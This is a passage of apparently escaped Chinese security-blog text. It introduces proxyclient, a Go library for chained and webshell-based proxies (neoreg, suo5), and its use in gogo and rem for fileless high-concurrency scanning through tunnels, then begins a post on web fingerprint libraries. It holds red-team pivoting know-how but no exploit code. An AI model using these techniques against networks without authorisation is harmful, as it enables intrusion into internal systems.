<p>\u540e\u6765\u6709\u4eba\u57fa\u4e8e\u8fd9\u4e2a\u5e93\u91cd\u6784\u4e86\u4e00\u4e2a https://github.com/zhuhaow/ProxyClient \uff0c\u8fd9\u4e2a\u5e93\u66f4\u52a0\u62bd\u8c61\uff0c \u53ef\u80fd\u662f\u4f5c\u8005\u85cf\u62d9\uff0c \u6211\u5728\u4eb2\u81ea\u6d4b\u8bd5\u540e\uff0c\u53d1\u73b0\u5176\u9664\u4e86\u62bd\u8c61\u6bd4\u8f83\u4f18\u96c5\u4e4b\u5916\uff0c \u6240\u6709\u7684\u529f\u80fd\u90fd\u65e0\u6cd5\u4f7f\u7528\uff0c \u5728\u6bcf\u4e2a\u534f\u8bae\u91cc\u90fd\u7559\u4e86\u5751\u3002 </p> <p>\u800crem\u53c8\u6709\u6b64\u9700\u6c42\uff0c \u56e0\u6b64\u53ea\u597d\u5728\u524d\u4eba\u7684\u5de5\u4f5c\u4e0a\u91cd\u65b0\u5b9e\u73b0\uff0c \u5e76\u6dfb\u52a0\u4e86\u66f4\u591a\u7684\u529f\u80fd\u3002 </p> <p>\u65b0\u7684\u5e93: https://github.com/chainreactors/proxyclient . \u7ee7\u627f\u4e86zhuhaow\u7684\u4ee3\u7801\u98ce\u683c\uff0c \u5e76\u4fee\u590d\u4e86\u5176\u7559\u4e0b\u7684\u5404\u79cdbug<sub>~(\u6211\u611f\u89c9\u662f\u539f\u4f5c\u8005\u6545\u610f\u7559\u4e0b\u7684)</sub>~\u3002</p> <p>\u73b0\u5728\uff0c \u6211\u4eec\u53ef\u4ee5\u57fa\u4e8eproxyclient\u5e93\u4f7f\u7528\u4efb\u610f\u4fe1\u9053\u4f5c\u4e3atcp,udp,http\u7684\u524d\u7f6e\u4ee3\u7406\uff0c \u4ee5\u53ca\u94fe\u5f0f\u4ee3\u7406\u3002</p> <p>\u793a\u4f8b:</p> <pre><code>func main() {\n    proxy, _ := url.Parse(\"http://localhost:8080\")\n    dial, _ := proxyclient.NewClient(proxy)\n    client := &amp;http.Client{\n        Transport: &amp;http.Transport{\n            DialContext: dial.Context,\n        },\n    }\n    request, err := client.Get(\"http://www.example.com\")\n    if err != nil {\n        panic(err)\n    }\n    content, err := ioutil.ReadAll(request.Body)\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(string(content))\n}\n</code></pre> <p>\u65b0\u7684proxyclient\u4e2d\u5df2\u7ecf\u5b9e\u73b0\u4e86\u4ee5\u4e0b\u534f\u8bae:</p> <ul> <li>Direct</li> <li>Reject</li> <li>Blackhole</li> <li>HTTP (fixed)</li> <li>HTTPS (fixed)</li> <li>SOCKS5 (fixed)</li> <li>ShadowSocks (fixed)</li> <li>SSH  (fixed)</li> </ul> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u8fd9\u662f\u4e00\u4e2a\u7ed9golang\u5f00\u53d1\u8005\u63d0\u4f9b\u7684\u7684\u4ee3\u7406\u5e93\uff0c\u5f53\u7136\u7ecf\u8fc7\u7b80\u5355\u7684\u5c01\u88c5\u4e4b\u540e\u4e5f\u80fd\u53d8\u4e3a\u7c7b\u4f3cproxychain\u8fd9\u6837\u7684\u4ee3\u7406\u5ba2\u6237\u7aef\u3002 </p> <p>\u73b0\u5728gogo\u5df2\u7ecf\u5c06proxyclient\u4f5c\u4e3a\u5176\u4ee3\u7406\u7684\u5b9e\u73b0\uff0c \u5e76\u4e14\u5bf9\u539f\u672c\u4ee3\u7801\u7684\u4fb5\u5165\u6027\u6781\u5c0f\uff1a</p> <p>gogo\u4e2d\u7684\u4f7f\u7528: <pre><code>    if len(r.Proxy) != 0 {\n        var proxies []*url.URL\n        for _, u := range r.Proxy {\n            uri, err := url.Parse(u)\n            if err != nil {\n                logs.Log.Warnf(\"parse proxy error %s, skip proxy!\", err.Error())\n            } else {\n                proxies = append(proxies, uri)\n            }\n        }\n        dialer, err := proxyclient.NewClientChain(proxies)\n        if err != nil {\n            logs.Log.Warnf(\"parse proxy error %s, skip proxy!\", err.Error())\n        }\n        neuhttp.DefaultTransport.DialContext = dialer.DialContext\n        DefaultTransport.DialContext = dialer.DialContext\n        ProxyDialTimeout = func(network, address string, duration time.Duration) (net.Conn, error) {\n            ctx, _ := context.WithTimeout(context.Background(), duration)\n            return dialer.DialContext(ctx, network, address)\n        }\n    }\n</code></pre></p> <p>\u7b80\u5355\u4fee\u6539\uff0c \u66ff\u6362\u4e86\u5168\u5c40\u8fde\u63a5\u6c60\u4e2d\u7684DialContext\u51fd\u6570\uff0c \u5c31\u8ba9gogo\u652f\u6301\u4e86\u94fe\u5f0f\u4ee3\u7406\uff0c\u591a\u534f\u8bae\u4ee3\u7406\u7b49\u7b49\u7279\u6027\uff0c\u5df2\u5728 https://github.com/chainreactors/gogo/releases/tag/v2.13.6 \u53d1\u5e03</p>"},{"location":"blog/2025/02/14/proxyclient-introduce/#\u4ee3\u7406\u7684\u8fb9\u754c","title":"\u4ee3\u7406\u7684\u8fb9\u754c","text":"<p>\u5728\u4ecb\u7ecd\u4e86\u57fa\u672c\u7684\u529f\u80fd\u540e\uff0c \u672c\u6587\u624d\u6b63\u5f0f\u5f00\u59cb\u3002</p> <p>\u662f\u5426\u6709\u4eba\u60f3\u8fc7\u57fa\u4e8ewebshell\u7684\u4ee3\u7406(neoreg, suo5)\u4e0ehttp\u4ee3\u7406\u662f\u5426\u6709\u672c\u8d28\u4e0d\u540c?</p> <p>\u7b54\u6848\u662f\u6ca1\u6709\u533a\u522b\uff0c \u65e2\u7136\u80fd\u57fa\u4e8ehttp\u4ee3\u7406\u53bb\u5b9e\u73b0proxyclient\uff0c \u90a3\u4e48neoreg\uff0csuo5 \u4ee5\u53ca\u4efb\u610f\u81ea\u5b9a\u4e49\u7684\u4ee3\u7406\u534f\u8bae\u90fd\u662f\u53ef\u4ee5\u7684\u3002 </p> <p>\u90a3\u4e48\u4f8b\u5982neoreg\uff0c \u5e94\u8be5\u5982\u4f55\u5b9e\u73b0\u5176\u4f5c\u4e3aproxyclient.</p> <p>\u5b9e\u9645\u4e0a\u53ea\u9700\u8981\uff0c\u5c06\u5176\u62bd\u8c61\u4e3aneoregClient\u548cneoregConn\u3002</p> <p>\u4e3aClient\u5b9e\u73b0Dial\u63a5\u53e3\uff0c \u5728Dial\u65f6\u57fa\u4e8eneoreg\u7684\u534f\u8bae\u5efa\u7acb\u4fe1\u9053\uff0c\u5e76\u8fd4\u56deneoregConn\uff0c \u7136\u540e\u4e3aneoregConn\u5b9e\u73b0\u5bf9\u5e94\u534f\u8bae\u7684Read\u548cWrite\u63a5\u53e3\u5373\u53ef\u3002 \u8bf4\u8d77\u6765\u5176\u5b9e\u975e\u5e38\u7b80\u5355\uff0c \u5177\u4f53\u7684\u4ee3\u7801\u5b9e\u73b0\u53ef\u89c1: https://github.com/chainreactors/proxyclient/blob/master/neoreg/neoreg.go</p> <p>\u5f53\u7136\u5b9e\u9645\u60c5\u51b5\u4f1a\u590d\u6742\u4e00\u4e9b\uff0c\u4f8b\u5982\u5728neoreg\u4e2d\uff0c\u539f\u672c\u4f7f\u7528\u4e86python\u7684\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u6211\u4e0d\u5f97\u4e0d\u57fa\u4e8ecpython\u7684\u6e90\u7801\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7b49\u4ef7\u7684golang\u7248\u672c\u3002 </p> <p>\u641e\u5b9aneoreg\u540e\uff0csuo5\u4e5f\u662f\u540c\u7406\uff0c\u53c8\u6216\u8005\u662f\u4efb\u610f\u7b2c\u4e09\u65b9\u7684\u4ee3\u7406\u534f\u8bae\uff0c \u5982\u679c\u60f3\u7684\u8bdd\uff0c\u751a\u81f3\u53ef\u4ee5\u5b9e\u73b0frp, nps, xray, v2ray\u7b49\u7b49\u9ad8\u7ea7\u4ee3\u7406\u7684proxyclient. </p> <p>\u6700\u7ec8\u6548\u679c</p> <p>neoreg: https://github.com/chainreactors/proxyclient/tree/master/neoreg suo5: https://github.com/chainreactors/proxyclient/tree/master/suo5</p> <p>(\u521d\u6b65\u5b9e\u73b0\uff0c \u8fd8\u9700\u8981\u4e00\u5b9a\u65f6\u95f4\u6253\u78e8)</p> <p>\u4f7f\u7528\u65f6\u9700\u8981\u624b\u52a8\u5f15\u5165:</p> <pre><code>import (  \n    _ \"github.com/chainreactors/proxyclient/neoreg\"  \n    _ \"github.com/chainreactors/proxyclient/suo5\"  \n)\n\nfunc main() {\n    proxy, _ := url.Parse(\"neoreg://localhost:8080\")\n    dial, _ := proxyclient.NewClient(proxy)\n}\n</code></pre> <p>\u5df2\u7ecf\u7528\u4e0aproxyclient\u7684\u9879\u76ee:</p> <ul> <li>https://github.com/chainreactors/gogo</li> <li>https://github.com/chainreactors/zombie</li> <li>https://github.com/chainreactors/malice-network</li> <li>https://github.com/zema1/suo5</li> </ul> <p>proxyclient\u6a21\u7cca\u4e86\u6570\u636e\u4f20\u8f93\u4e0e\u4ee3\u7406\u7684\u8fb9\u754c\uff0c \u53ea\u8981\u5b58\u5728\u6570\u636e\u4ea4\u6362\u7684\u5730\u65b9\uff0c\u5c31\u53ef\u4ee5\u5c06\u5176\u6ce8\u518c\u5230proxyclient</p> <p>\u5982\u679c\u4f60\u7684\u5de5\u5177\u6709\u4ee3\u7406\u7684\u9700\u6c42, \u5c06\u5176\u5207\u6362\u5230proxyclient\u53ea\u9700\u898110\u5206\u949f\uff0c\u4e0d\u4f1a\u5e26\u6765\u4efb\u4f55\u7684\u526f\u4f5c\u7528\uff0c \u5c31\u80fd\u6781\u5927\u7684\u62d3\u5c55\u8fd9\u4e48\u65b9\u9762\u7684\u80fd\u529b\u3002</p>"},{"location":"blog/2025/02/14/proxyclient-introduce/#\u6027\u80fd\u65e0\u635f\u7684\u4ee3\u7406","title":"\u6027\u80fd\u65e0\u635f\u7684\u4ee3\u7406","text":"<p>\u73b0\u5728\u53ef\u4ee5\u56de\u5230\u4e00\u5f00\u59cb\u7684\u8bef\u533a\u4e2d\u4e86\uff0c \u4e4b\u524d\u63d0\u5230</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\u65e0\u6cd5\u5728\u4ee3\u7406\u73af\u5883\u4e2d\u4f7f\u7528,\u9664\u975e\u4f7f\u7528-t\u53c2\u6570\u6307\u5b9a\u8f83\u4f4e\u7684\u901f\u7387(\u9ed8\u8ba4\u5e76\u53d1\u4e3a4000).</p> <p>\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4ee3\u7406\u73af\u5883\u4e2d\u626b\u63cf\u4f1a\u5bfc\u81f4\u5927\u91cf\u4e22\u5305\u3002 \u539f\u56e0\u6709\u5f88\u591a:</p> <ol> <li>\u4ee3\u7406\u7684server\u7aef\u5b9e\u73b0\u53c2\u5dee\u4e0d\u9f50\uff0c\u6709\u5f88\u591a\u5355\u6587\u4ef6\u7684socks5\u5de5\u5177\uff0c\u5728\u6027\u80fd\u4e0a\u6ca1\u505a\u4f18\u5316</li> <li>\u73af\u5883\u9650\u5236\uff0c \u4f8b\u5982webshell\u4ee3\u7406\uff0c \u53d7\u9650\u4e8e\u5404\u79cd\u8bed\u8a00\u73af\u5883\uff0c\u8fd0\u884c\u73af\u5883\uff0c \u5728\u5e76\u53d1\u6027\u80fd\u4e0a\u901a\u5e38\u4e0d\u4f1a\u5f88\u597d\u3002\u5982\u679c\u4e0d\u80fd\u642d\u5efa\u53cc\u5de5\u4fe1\u9053\uff0c \u53ea\u80fd\u901a\u8fc7\u8f6e\u8be2\u53bb\u6a21\u62df\u957f\u8fde\u63a5\uff0c\u6027\u80fd\u74f6\u9888\u5c31\u66f4\u660e\u663e\u4e86\u3002</li> <li>client\u9650\u5236\uff0c\u901a\u5e38\u5728\u642d\u5efa\u96a7\u9053\u540e\uff0c \u6211\u4eec\u4f1a\u4f7f\u7528proxifier, proxychains, clash\u8fd9\u7c7b\u5de5\u5177\u53bb\u8fde\u63a5\uff0c\u8fd9\u4e9b\u5de5\u5177\u5f80\u5f80\u53ea\u5bf9\u5e26\u5bbd\u505a\u4e86\u4f18\u5316\uff0c\u57fa\u672c\u5565\u90fd\u6ca1\u6709\u5bf9\u4e8e\u9ad8\u5e76\u53d1\u573a\u666f\u4f18\u5316\u3002</li> </ol> <p>\u5982\u679c\u89e3\u51b3\u4e86\u8fd9\u4e9b\u95ee\u9898\uff0c\u5c31\u80fd\u5b9e\u73b0\u4e0d\u843d\u5730(\u65e0\u6587\u4ef6\u843d\u5730\uff0c \u4e5f\u4e0d\u5185\u5b58\u52a0\u8f7d)\u7684\u9ad8\u5e76\u53d1\u626b\u63cf\uff0c \u53ea\u9700\u8981\u642d\u5efa\u4e00\u4e2a\u9ad8\u6027\u80fd\u7684\u96a7\u9053\uff0c \u5c31\u80fd\u5728\u672c\u673a\u901a\u8fc7proxyclient\u50cf\u843d\u5730\u4e00\u6837\u53bb\u626b\u63cf\u3002</p> <p>\u8fd9\u4e2a\u9700\u6c42\u7565\u5fae\u8d85\u51fa\u4e86proxyclient\u7684\u80fd\u529b\u8303\u56f4\uff0c \u56e0\u4e3a\u8fd8\u9700\u8981\u5b9e\u73b0\u5bf9\u5e94\u7684proxy server\u3002 \u8fd9\u5c31\u9700\u8981rem\u51fa\u624b\u4e86\u3002 </p> <p>\u901a\u8fc7rem\u642d\u5efa\u4ee3\u7406\u4fe1\u9053\u540e, \u6211\u4eec\u901a\u8fc7\u5185\u5b58\u76f4\u63a5\u4e0erem\u6784\u9020\u7684\u865a\u62df\u4fe1\u9053\u901a\u8baf\uff0c\u8fd9\u514d\u53bb\u4e86\u5728proxy\u7684client\u4e0eserver\u901a\u8baf\u65f6\uff0c \u9ad8\u5e76\u53d1\u5bfc\u81f4\u7684\u5927\u91cf\u8fde\u63a5\u4e0e\u63e1\u624b\u6d6a\u8d39\uff0c \u5e76\u80fd\u590d\u7528rem\u81ea\u8eab\u5b9e\u73b0\u94fe\u63a5\u590d\u7528\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c proxyclient\u76f4\u63a5\u4e0erem\u5728\u5185\u5b58\u4e2d\u8fdb\u884c\u6570\u636e\u4ea4\u6362\uff0c \u6ca1\u6709\u7f51\u7edc\u94fe\u63a5\uff0c rem server\u4e0erem client\u4e4b\u95f4\u5b9e\u73b0\u4e86\u94fe\u63a5\u590d\u7528\uff0c \u53ea\u6709\u6781\u5c11\u7684\u8fde\u63a5\u6570\uff0c\u5e26\u5bbd\u5373\u4e3a\u6027\u80fd\u3002 </p> <p>\u7136\u540e\u5728rem\u6240\u5728\u7684\u7f51\u7edc\u4e2d\uff0c\u57fa\u4e8egolang\u7684goroutine\u8fdb\u884c\u9ad8\u5e76\u53d1\u8bf7\u6c42\uff0c rem\u4e8b\u5b9e\u4e0a\u5c31\u53d8\u6210\u4e86\u626b\u63cf\u5668\u7684agent\uff0c \u53ea\u8981\u5e26\u5bbd\u901a\u7545\uff0c\u51e0\u4e4e\u6ca1\u6709\u989d\u5916\u7684\u6027\u80fd\u635f\u8017\u3002 </p> <pre><code>func newRemProxyClient(proxyURL *url.URL, upstreamDial proxyclient.Dial) (proxyclient.Dial, error) {\n    return func(network, address string) (net.Conn, error) {\n        memoryPipe := utils.RandomString(8)\n        console, err := NewConsoleWithCMD(fmt.Sprintf(\"-c %s -m proxy -l memory+socks5://:@%s\", proxyURL.String(), memoryPipe))\n        a, err := console.Dial(&amp;core.URL{URL: proxyURL})\n        if err != nil {\n            return nil, err\n        }\n        go func() {\n            err := a.Handler()\n            if err != nil {\n                logs.Log.Error(err)\n                return\n            }\n        }()\n\n        for {\n            if a.Init {\n                break\n            } else {\n                time.Sleep(100 * time.Millisecond)\n            }\n        }\n        memURL := &amp;url.URL{\n            Scheme: \"memory\",\n            Host:   memoryPipe,\n        }\n        memClient, err := proxyclient.NewClient(memURL)\n        if err != nil {\n            return nil, err\n        }\n        return memClient.Dial(network, address)\n    }, nil\n}\n</code></pre> <p>\u901a\u8fc7proxyclient\u7559\u4e0b\u7684\u52a8\u6001\u6ce8\u518c\u7684\u63a5\u53e3\uff0c \u5c06rem\u534f\u8bae\u6ce8\u518c\u8fdb\u53bb\u3002 </p> <p>\u8fd9\u90e8\u5206\u4ee3\u7801\u5728rem\u4e2d\u5b9e\u73b0\uff0c \u6240\u4ee5\u9700\u8981\u7b49rem\u53d1\u5e03\u540e\u624d\u80fd\u4f53\u9a8c\u5230\u3002 </p>"},{"location":"blog/2025/02/14/proxyclient-introduce/#end","title":"End","text":"<p>proxyclient\u662frem\u7684\u4e00\u89d2\uff0c rem\u8fd8\u6709\u975e\u5e38\u591a\u72ec\u6709\u7684\u5148\u8fdb\u7279\u6027\uff0c \u5176\u6838\u5fc3\u8bbe\u8ba1\u53ef\u4ee5\u5728 https://chainreactors.github.io/wiki/rem/design/  \u91cc\u9884\u89c8\u3002\u8fd9\u4e5f\u5bfc\u81f4\u4e86\u5bf9rem\u7684\u5f00\u6e90\u6709\u4e00\u5b9a\u62c5\u5fe7\uff0c \u62c5\u5fc3\u8fd9\u4e9b\u7279\u6027\u4f1a\u88ab\u6ee5\u7528\u3002 </p> <p>rem\u5c06\u4f1a\u4ee5rem-community\u7684\u5f62\u5f0f\u53d1\u5e03\uff0c \u4fdd\u7559\u5b8c\u6574\u7684\u63a5\u53e3\u62bd\u8c61\uff0c \u4f46\u662f\u5728\u4e00\u4e9b\u5177\u4f53\u5b9e\u73b0\u4e0a\u5220\u9664\u4e86\u8fc7\u4e8e\u6709\u4fb5\u7565\u6027\u7684\u7279\u6027\uff0c\u4f7f\u7528\u8005\u53ef\u4ee5\u57fa\u4e8e\u81ea\u8eab\u9700\u6c42\u81ea\u884c\u4fee\u6539\u3002 \u5220\u9664\u4fb5\u7565\u6027\u540e\u7684rem-community\u4e5f\u662f\u76ee\u524d\u6700\u5148\u8fdb\u7684\u4ee3\u7406\u5de5\u5177\u3002 \u9884\u8ba1\u5728\u672c\u6587\u53d1\u5e03\u540e\u7684\u4e24\u5468\u5230\u4e09\u5468\u540e\u53d1\u5e03.</p>"},{"location":"blog/2024/07/24/fingers-introduce/","title":"\u6307\u7eb9\u7684\u7ec8\u6781\u89e3\u51b3\u65b9\u6848","text":""},{"location":"blog/2024/07/24/fingers-introduce/#intro","title":"Intro","text":"<p>\u6307\u7eb9\u5e93\u5f53\u524d\u8f83\u4e3a\u70ed\u95e8\u7684\u9886\u57df\u4e4b\u4e00, \u56e0\u4e3a\u6bcf\u4e2aASM(\u653b\u51fb\u9762\u7ba1\u7406)\u90fd\u9700\u8981\u4e00\u4e2a\u5f3a\u5927\u7684\u6307\u7eb9\u5e93, \u800c\u5404\u5bb6\u5927\u5382\u90fd\u5728\u505a\u81ea\u5df1\u7684ASM..  \u6307\u7eb9\u5e93\u4e0e\u6f0f\u6d1e\u5e93\u4f5c\u4e3a\u5b89\u5168\u77e5\u8bc6\u5e93\u7684\u4e24\u4e2a\u91cd\u8981\u7ec4\u6210\u90e8\u5206, \u4e5f\u662f\u5404\u5bb6\u57fa\u5efa\u5fc5\u5b9a\u4f1a\u5173\u6ce8\u7684\u9886\u57df.</p> <p>\u5bf9\u4e8e\u8fd9\u4e2a\u95ee\u9898, \u5927\u591a\u6570\u5382\u5546\u9009\u62e9\u5806\u4eba\u529b\u89e3\u51b3, \u62db\u51e0\u4e2a\u8fd0\u8425, \u7ed9\u4ed6\u4eec\u5b9a\u4e0a\u51e0\u4e2a\u6708\u51e0\u767e\u6761\u6307\u7eb9\u7684KPI, \u4e00\u4e24\u5e74\u65f6\u95f4\u5c31\u80fd\u628a\u5e02\u9762\u4e0a\u7684\u5927\u591a\u6570\u4ea7\u54c1\u56ca\u62ec, \u770b\u8d77\u6765\u4f3c\u4e4e\u5bf9\u5927\u5382\u6765\u8bf4\u4e5f\u4e0d\u662f\u4e2a\u96be\u4ee5\u89e3\u51b3\u7684\u95ee\u9898. \u4f46\u4e8b\u5b9e\u771f\u7684\u5982\u6b64\u4e48?</p>"},{"location":"blog/2024/07/24/fingers-introduce/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u5728\u53d1\u5e03gogo\u65f6, \u66fe\u7ecf\u4e13\u95e8\u4ecb\u7ecd\u8fc7gogo\u7684\u6307\u7eb9\u5f15\u64ce . \u4e24\u5e74\u8fc7\u53bb\u4e86gogo\u5185\u5d4c\u7684\u6307\u7eb9\u5f15\u64ce\u5df2\u7ecf\u7ecf\u8fc7\u597d\u51e0\u6b21\u91cd\u6784, \u6dfb\u52a0\u4e86\u5927\u91cf\u65b0\u7279\u6027, \u5e76\u4e14\u4ecegogo\u4e2d\u72ec\u7acb\u51fa\u6765\uff0c\u6210\u4e3a\u4e00\u4e2a\u57fa\u7840\u5e93\u63d0\u4f9b\u7ed9\u591a\u4e2a\u5de5\u5177\u4f7f\u7528, \u4e5f\u662f\u672c\u6587\u73b0\u5728\u4ecb\u7ecd\u7684\u5185\u5bb9\u3002 </p>"},{"location":"blog/2024/07/24/fingers-introduce/#nmap","title":"nmap","text":"<p>\u5f00\u6e90\u4e16\u754c\u6700\u77e5\u540d\u7684\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u4e0e\u6307\u7eb9\u5e93\u6beb\u65e0\u7591\u95ee\u662fnmap</p> <p>nmap\u6709\u7740\u5168\u9762\u800c\u5f3a\u5927\u7684\u89c4\u5219\u5e93:</p> <ul> <li>service-probes \u4e3b\u8981\u7684\u8bc6\u522b\u89c4\u5219\u4e0e\u4e3b\u52a8\u63a2\u9488</li> <li>services \u9ed8\u8ba4\u7aef\u53e3\u4e0e\u670d\u52a1\u7684\u6620\u5c04\u8868</li> <li>nse\u4ed3\u5e93 nmap\u63d2\u4ef6\u4ed3\u5e93, \u5305\u542b\u4e86\u5927\u91cf\u534f\u8bae\u7684\u5b9e\u73b0</li> <li>...nmap\u81ea\u8eab\u8fd8\u6709\u4e0d\u5c11\u89c4\u5219\u6587\u4ef6, \u90a3\u4e9b\u4e0e\u6211\u4eec\u7684\u573a\u666f\u76f8\u8ddd\u8f83\u8fdc \u6682\u65f6\u5ffd\u7565</li> </ul> <p>\u4f46\u4e3a\u4ec0\u4e48\u8d8a\u6765\u8d8a\u5c11\u4eba\u4f7f\u7528nmap\u4f5c\u4e3a\u9996\u9009\u7684\u6307\u7eb9\u8bc6\u522b\u5de5\u5177, \u73b0\u5728\u8fd8\u5728\u575a\u6301\u4f7f\u7528\u7684\u4eba\u4e5f\u5927\u591a\u5c06\u5b83\u5f53\u4f5c\u7aef\u53e3\u63a2\u6d4b\u5de5\u5177. </p> <p>\u539f\u56e0\u4e5f\u975e\u5e38\u7b80\u5355, nmap\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u80fd\u8bc6\u522b\u7684\u670d\u52a1\u4e0d\u591a, \u5f00\u542f\u5168\u89c4\u5219\u7684\u63a2\u6d4b\u53c8\u592a\u6162, \u6700\u5173\u952e\u7684\u8fd8\u6709\u7f3a\u5c11\u5927\u91cfweb\u670d\u52a1\u7684\u6307\u7eb9\u8bc6\u522b. \u7279\u522b\u662f\u975e\u901a\u7528\u7ec4\u4ef6\u7684\u4f9b\u5e94\u94fe\u7cfb\u7edf\u7684\u8bc6\u522b. </p>"},{"location":"blog/2024/07/24/fingers-introduce/#web\u6307\u7eb9","title":"web\u6307\u7eb9","text":"<p>nmap\u6709\u8fd9\u6837\u7684\u7f3a\u9677, \u81ea\u7136\u5c31\u4f1a\u51fa\u73b0\u89e3\u51b3\u7684\u65b9\u6848. \u6700\u77e5\u540d\u7684\u89e3\u51b3\u65b9\u6848\u80af\u5b9a\u662fwappalyzer. \u8fd9\u4e2a\u89c4\u5219\u5e93\u6709\u4e00\u4e2a\u6bd4\u8f83\u5168\u7684\u8986\u76d6\u9762(\u7ea64000\u4e2aapp), \u5e76\u652f\u6301\u7248\u672c\u7684\u5339\u914d, \u4ee5\u53ca\u5404\u79cdtag\u5bf9\u6307\u7eb9\u8fdb\u884c\u5206\u7c7b. </p> <p>\u9664\u6b64\u4e4b\u5916, \u8fd8\u6709\u4e00\u4e9b\u8f83\u4e3a\u77e5\u540d\u7684\u9879\u76ee:</p> <ul> <li>WhatWeb , \u5927\u7ea61800+\u6307\u7eb9, \u4e3b\u8981\u662f\u901a\u7528\u7ec4\u4ef6\u7684\u6307\u7eb9</li> <li>ehole \u5927\u7ea6900+\u6307\u7eb9, \u4e3b\u8981\u6709\u4e0d\u5c11\u56fd\u5185\u7684\u4f9b\u5e94\u94fe\u4ea7\u54c1 </li> <li>fingerprinthub \u5927\u7ea63500\u6761\u6307\u7eb9, \u8986\u76d6\u56fd\u5185\u5916\u5e38\u89c1\u5e94\u7528; \u901a\u8fc7github action \u81ea\u52a8\u63d0\u4ea4\u7ed9nuclei\u89c4\u5219\u5e93, \u4e5f\u662fnuclei\u76ee\u524d\u7684\u4e3b\u8981\u6307\u7eb9\u8bc6\u522b\u624b\u6bb5\u4e4b\u4e00; \u91c7\u7528yaml\u72ec\u7acb\u7ba1\u7406, \u81ea\u52a8\u751f\u6210\u7edf\u4e00\u7684json\u683c\u5f0f. \u662f\u5de5\u7a0b\u5316\u505a\u7684\u6700\u597d\u7684\u6307\u7eb9\u9879\u76ee</li> <li>tidefinger \u7ea61800\u6761\u6307\u7eb9, \u6307\u7eb9\u6765\u81eaWhatWeb\u3001Wappalyzer\u3001fofa</li> <li>kscan \u7c97\u7565\u7edf\u8ba1\u7ea614000+, \u6574\u7406\u81ea\u591a\u4e2a\u6307\u7eb9\u5e93</li> <li>gogo \u7ea64500\u6761, \u6211\u7f16\u5199\u7684\u6307\u7eb9\u4ed3\u5e93\u4e0e\u6307\u7eb9\u5f15\u64ce. </li> <li>\u95ed\u6e90\u6307\u7eb9\u5e93 \u4ece\u5404\u79cd\u5546\u4e1a\u5de5\u5177\u4e2d\u9006\u5411\u63d0\u53d6\u7684, \u5982goby(\u7ea67000), cube, tanggo, xray\u7b49\u7b49</li> </ul> <p>\u4e0a\u9762\u8fd9\u4e9b\u6307\u7eb9\u5e93\u52a0\u8d77\u6765, \u5e94\u8be5\u80fd\u8986\u76d6\u7edd\u5927\u591a\u6570\u7684\u4ea7\u54c1\u4e0e\u5e94\u7528. </p> <p>\u6211\u81ea\u5df1\u4e5f\u5c1d\u8bd5\u505a\u8fc7\u6307\u7eb9\u5e93, \u6df1\u77e5\u5176\u4e2d\u7684\u9ebb\u70e6\u7a0b\u5ea6. \u51e0\u4e4e\u6bcf\u4e2a\u6307\u7eb9\u5e93\u5f00\u59cb\u90fd\u4f1a\u4ece\u5176\u4ed6\u6307\u7eb9\u5e93\u5bfc\u5165, \u7136\u540e\u901a\u8fc7\u5404\u79cd\u6570\u636e\u5904\u7406\u64cd\u4f5c, \u5c06\u4e0d\u540c\u89c4\u5219\u7684\u6307\u7eb9\u5e93\u7edf\u4e00\u5230\u81ea\u5df1\u7684\u89c4\u5219\u4e0b.  \u7136\u540e\u8fdb\u884c\u6781\u5176\u7e41\u7410\u7684\u6d4b\u8bd5, \u7b5b\u9009, \u8fc7\u6ee4. \u56e0\u6b64, \u6211\u81ea\u5df1\u5199\u7684\u6307\u7eb9\u5e93\u5728\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u540e, \u5b9e\u5728\u65e0\u529b\u7ef4\u62a4, \u66f4\u65b0\u9891\u7387\u4e0b\u964d\u4e86\u5f88\u591a. </p> <p>\u4ece\u6570\u91cf\u4e0a\u770b, \u53bb\u6389\u4e0a\u9762\u8fd9\u4e9b\u6307\u7eb9\u5e93\u7684\u5404\u79cd\u4ea4\u53c9\u5f15\u7528, \u603b\u7684\u6307\u7eb9\u6570\u5927\u7ea6\u572810000\u6761\u5de6\u53f3, \u57fa\u672c\u80fd\u591f\u8986\u76d6\u7edd\u5927\u591a\u6570\u4ea7\u54c1. </p>"},{"location":"blog/2024/07/24/fingers-introduce/#\u56f0\u96be","title":"\u56f0\u96be","text":""},{"location":"blog/2024/07/24/fingers-introduce/#\u6307\u7eb9\u5e93\u5dee\u5f02","title":"\u6307\u7eb9\u5e93\u5dee\u5f02","text":"<p>\u4ece\u4e0a\u9762\u7684\u5404\u4e2a\u6307\u7eb9\u5e93\u5dee\u5f02\u5c31\u53ef\u4ee5\u770b\u7684\u51fa\u6765\u6574\u7406\u89c4\u5219\u7684\u56f0\u96be\u7a0b\u5ea6, \u800c\u66f4\u5927\u7684\u9ebb\u70e6\u5728\u4e8e, \u901a\u8fc7\u590d\u6742\u7684\u624b\u6bb5\u5904\u7406\u540e\u7684\u89c4\u5219\u786e\u5b9e\u80fd\u5728\u5404\u4e2a\u5f00\u53d1\u8005\u81ea\u5df1\u7684\u5de5\u5177\u4e0a\u8dd1\u8d77\u6765, \u4f46\u6307\u7eb9\u5f15\u64ce\u7684\u5dee\u5f02\u4f1a\u8ba9\u4e0d\u540c\u89c4\u5219\u5e93\u7684\u6307\u7eb9\u6548\u529b\u6709\u5de8\u5927\u7684\u5dee\u522b. </p> <p>\u6211\u5c1d\u8bd5\u4ece\u5176\u4ed6\u6307\u7eb9\u5e93\u79fb\u690d\u6307\u7eb9\u65f6, \u7f16\u5199\u6570\u636e\u8f6c\u6362\u7684\u811a\u672c\u53ea\u9700\u8981\u51e0\u4e2a\u5c0f\u65f6, \u4f46\u7b5b\u9009\u6389\u65e0\u6548\u6570\u636e\u9700\u8981\u82b1\u8d39\u51e0\u5468\u751a\u81f3\u51e0\u4e2a\u6708\u7684\u65f6\u95f4. </p> <p>\u6307\u7eb9\u5e93\u5dee\u5f02\u9664\u4e86\u5728\u8bc6\u522b\u80fd\u529b\u4e0a\u7684\u4e0d\u540c\u4e4b\u5916, 